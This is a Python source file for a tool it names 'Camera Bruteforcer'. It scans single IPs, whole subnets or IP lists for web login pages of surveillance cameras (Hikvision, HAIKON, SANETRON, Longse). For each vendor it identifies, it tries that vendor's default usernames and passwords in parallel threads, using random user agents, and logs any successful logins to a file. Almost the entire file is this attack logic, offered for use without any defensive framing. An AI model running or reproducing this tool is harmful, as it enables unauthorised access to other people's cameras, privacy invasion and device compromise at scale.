from lib.identify import CAMERA_IDENTIFIERS,identify_camera
import colorama
from lib.bruteforce import check_http_auth__SANETRON,check_http_auth__HAIKON,check_http_auth__Hikvision,check_http_auth__Longse
import argparse
import sys
import ipaddress
from datetime import datetime
from lib.env import DEFAULT_PORTS,SUB_THREAD_COUNT,URL_PATHS
from lib.user_agent_tools import randomUserAgent
import requests
import concurrent.futures
import threading
from queue import Queue, Empty
import bs4
import socket
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) 


DEFAULT_TIMEOUT = 2
FILE_LOCK = threading.Lock()
ip_queue = Queue()
total_ips = 0
scanned_ips = 0
scan_lock = threading.Lock()
socket_semaphore = threading.Semaphore(100)

def print_banner() -> None:
    banner = """                                  
                               ▒██                       ███        █ 
 ██████                ▓██▓    █░  █     █                 █        █ 
 █                    ▒█  █▒   █   █░ █ ░█                 █        █ 
 █      █░  █   ███   █░  ░█ █████ █░▒█▒░█  ███    █▒██▒   █     ██▓█ 
 █      ▓▒ ▒▓  ▓▓ ▒█  █    █   █   ▓▒███▒█ █▓ ▓█   ██  █   █    █▓ ▓█ 
 ██████ ▒█ █▒  █   █  █    █   █   ▒▒█▒█▒▓ █   █   █       █    █   █ 
 █       █ █   █████  █    █   █   ▒██ ██▓ █   █   █       █    █   █ 
 █       █▓▓   █      █░  ░█   █   ▒█▓ ▓█▒ █   █   █       █    █   █ 
 █       ▓█▒   ▓▓  █  ▒█  █▒   █   ░█▒ ▒█▒ █▓ ▓█   █       █░   █▓ ▓█ 
 ██████  ▒█     ███▒   ▓██▓    █    █   █▒  ███    █       ▒██   ██▓█ 
         ▒█                                                           
         █▒                                                           
        ██                                                            
    """
    print(colorama.Fore.YELLOW + banner + colorama.Fore.RESET)

def write_to_file(file_name:str,content:str) -> None:
    with open(file_name,"a") as file:
        file.write(f"{content}\n")

def check_port(ip: str, port: int) -> bool:
    try:
        with socket_semaphore:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                sock.settimeout(DEFAULT_TIMEOUT)
                return sock.connect_ex((str(ip), port)) == 0
    except Exception as e:
        return False

def worker(ip: str, threads: int, timeout: int, verbose: bool) -> None:    
    try:
        # Find active ports and collect responses
        active_ports = []
        for port in DEFAULT_PORTS:
            if check_port(ip, port):
                for url_path in URL_PATHS:
                    try:
                        url = f"http://{ip}:{port}{url_path}"
                        req = requests.get(
                            url, 
                            timeout=timeout,
                            headers={"User-Agent": randomUserAgent()},
                            verify=False
                        )
                        if req.ok:
                            print(colorama.Fore.CYAN + 
                                  f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] Path Found: {ip}:{port} -> {url}" + 
                                  colorama.Fore.RESET)
                            active_ports.append({
                                "port": port,
                                        "response_text": req.text, 
                                "full_url": url
                            })
                    except Exception:
                        continue

            
        if not active_ports:
            #print(colorama.Fore.RED + 
            #      f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] No active ports found for {ip}" + 
            #      colorama.Fore.RESET)
            return

        # Process each active port
        for port_data in active_ports:
            camera_type = identify_camera(port_data["response_text"])
            
            if camera_type is None:
                print(colorama.Fore.RED + 
                      f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {port_data['full_url']} - " +
                      "Non identified camera or web page" + colorama.Fore.RESET)
                continue
            
            print(colorama.Fore.CYAN + 
                  f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {port_data['full_url']} - {camera_type}" + 
                  colorama.Fore.RESET)

            # Kamera tipine göre işlem yap
            auth_funcs = {
                "hikvision_red_login_page": None,
                "dahura_xvr_login_page": None, 
                "hikvision_default_login_page": check_http_auth__Hikvision,
                "hikvision_haikon_login_page": check_http_auth__HAIKON,
                "sanetron_login_page": check_http_auth__SANETRON,
                "longse_login_page": check_http_auth__Longse
            }

            auth_func = auth_funcs.get(camera_type)
            if auth_func is None:
                continue


            with concurrent.futures.ThreadPoolExecutor(max_workers=SUB_THREAD_COUNT) as executor:
                futures = [
                    executor.submit(
                        auth_func,
                        ip,
                        port_data["port"],
                        cred["username"],
                        cred["password"],
                        FILE_LOCK,
                        write_to_file
                    )
                    for cred in CAMERA_IDENTIFIERS[camera_type]["default_credentials"]
                ]
                
                for future in futures:
                    if future.result():
                        executor.shutdown(wait=True)
                        break
                    
        # Update progress
        with scan_lock:
            global scanned_ips
            scanned_ips += 1
            if total_ips > 0:
                progress = (scanned_ips / total_ips) * 100
                print(colorama.Fore.CYAN + 
                      f"\rScan progress: {progress:.2f}% ({scanned_ips}/{total_ips} IP)", end="")
            
    except Exception as e:
        print(colorama.Fore.RED + 
              f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [ERROR] {e}" + 
              colorama.Fore.RESET)

def queue_worker(threads:int, timeout:int, verbose:bool):
    while True:
        try:
            ip = ip_queue.get_nowait()
            worker(ip, threads, timeout, verbose)
            ip_queue.task_done()
        except Empty:
            break
        except Exception as e:
            print(f"Worker error: {str(e)}")
            continue

def scan_single_ip(ip:str,threads:int,timeout:int,verbose:bool) -> None:
    global total_ips
    total_ips = 1
    worker(ip, threads, timeout, verbose)

def scan_subnet(subnet:str,threads:int,timeout:int,verbose:bool) -> None:
    global total_ips
    try:
        network = ipaddress.ip_network(subnet)
        total_ips = network.num_addresses - 2  # Exclude network and broadcast addresses
        
        print(colorama.Fore.CYAN + f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] "
              f"Starting scan of {total_ips} IPs in subnet {subnet}" + colorama.Fore.RESET)

        # Add IPs to queue
        for ip in network.hosts():
            ip_queue.put(str(ip))

        # Start worker threads
        with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
            futures = [executor.submit(queue_worker, threads, timeout, verbose) 
                      for _ in range(min(threads, total_ips))]
            concurrent.futures.wait(futures)

    except Exception as e:
        print(colorama.Fore.RED + f"Subnet scan error: {str(e)}" + colorama.Fore.RESET)

def scan_file(file:str,threads:int,timeout:int,verbose:bool) -> None:
    global total_ips
    try:
        with open(file, 'r') as f:
            ips = [line.strip() for line in f if line.strip()]
        
        total_ips = len(ips)
        print(colorama.Fore.CYAN + f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] "
              f"Starting scan of IPs from file {file}" + colorama.Fore.RESET)

        for ip in ips:
            ip_queue.put(ip)
            
        # Start worker threads
        with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
            futures = [executor.submit(queue_worker, threads, timeout, verbose) 
                      for _ in range(min(threads, len(ips)))]
            concurrent.futures.wait(futures)
            
    except Exception as e:
        print(colorama.Fore.RED + f"File scan error: {str(e)}" + colorama.Fore.RESET)

def main() -> None:
    print_banner()
    parser = argparse.ArgumentParser(description="Camera Bruteforcer")
    parser.add_argument("--ip", type=str, help="IP address to scan")
    parser.add_argument("--subnet", type=str, help="Subnet to scan")
    parser.add_argument("--file", type=str, help="File containing IP addresses")
    parser.add_argument("--threads", type=int, default=10, help="Number of threads to use")
    parser.add_argument("--timeout", type=int, default=2, help="Timeout for requests")
    parser.add_argument("--verbose", action="store_true", help="Verbose output")
    
    args = parser.parse_args()
    
    try:
        if args.ip:     
            scan_single_ip(args.ip,args.threads,args.timeout,args.verbose)
        elif args.subnet:
            scan_subnet(args.subnet,args.threads,args.timeout,args.verbose)
        elif args.file:
            scan_file(args.file,args.threads,args.timeout,args.verbose)
        else:
            print(colorama.Fore.RED + "No scan type provided" + colorama.Fore.RESET)
            parser.print_help()
            sys.exit(1)

        print("\n" + colorama.Fore.CYAN + f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] "
              f"Scan completed." + colorama.Fore.RESET)

    except KeyboardInterrupt:
        print("\nScan interrupted by user...")
    except Exception as e:
        print(colorama.Fore.RED + f"Unexpected error: {str(e)}" + colorama.Fore.RESET)

if __name__ == "__main__":
    main()